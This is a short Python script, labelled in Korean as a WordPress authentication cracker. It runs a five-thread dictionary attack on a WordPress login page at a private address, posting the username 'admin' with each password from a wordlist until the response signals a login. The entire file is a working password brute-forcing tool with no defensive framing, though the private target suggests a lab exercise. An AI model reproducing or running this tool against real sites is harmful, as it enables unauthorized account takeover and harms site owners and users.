#워드프레스 인증 크래커

from urllib.request import build_opener, HTTPCookieProcessor
import http.cookiejar as cookielib
from html.parser import HTMLParser
from urllib.parse import urlencode
from queue import Queue
from threading import Thread

num_threads = 5
wordlist = 'dictionary.txt'

targeturl = 'http://192.168.0.14/blog/wp-login.php'
targetpost = 'http://192.168.0.14/blog/wp-login.php'

username_field = 'log'
pass_field = 'pwd'
check = 'update'
isBingo = False


class myHTMLParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tagResult = {}
            
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            tagname = None
            tagvalue = None
            for name, value in attrs:
                if name == 'name':
                    tagname = value
                if name == 'value':
                    tagvalue = value
                            
            if tagname is not None:
                self.tagResult[tagname] = tagvalue
				
def webAuthCracker(q, username):
    global isBingo
    while not q.empty() and not isBingo:
        password = q.get().rstrip()
        cookies = cookielib.FileCookieJar('cookies')
        opener = build_opener(HTTPCookieProcessor(cookies))
        res = opener.open(targeturl)
        htmlpage = res.read().decode()
        
        print('+++TRYING %s: %s' %(username, password))
        
        parseR = myHTMLParser()
        parseR.feed(htmlpage)		
        
        inputtags = parseR.tagResult
        inputtags[username_field] = username
        inputtags[pass_field] = password
        
        loginData = urlencode(inputtags).encode('utf-8')
        loginRes = opener.open(targetpost, data=loginData)
        loginResult = loginRes.read().decode()
        
        if check in loginResult:
            isBingo = True
            print('---CRACKING SUCCESS!')
            print('---Username[%s] Password[%s]' %(username, password))
            print('---Waiting Other Threads Terminated..')


def main():
    username = 'admin'
            
    q = Queue()
    with open(wordlist, 'rt') as f:
        words = f.readlines()
    
    for word in words:
        word = word.rstrip()					
        q.put(word)
    
    print('+++[%s] CRACKING WEB AUTH START..' %username)
    
    for i in range(num_threads):
        t = Thread(target=webAuthCracker, args=(q, username))
        t.start()
	
	

main()
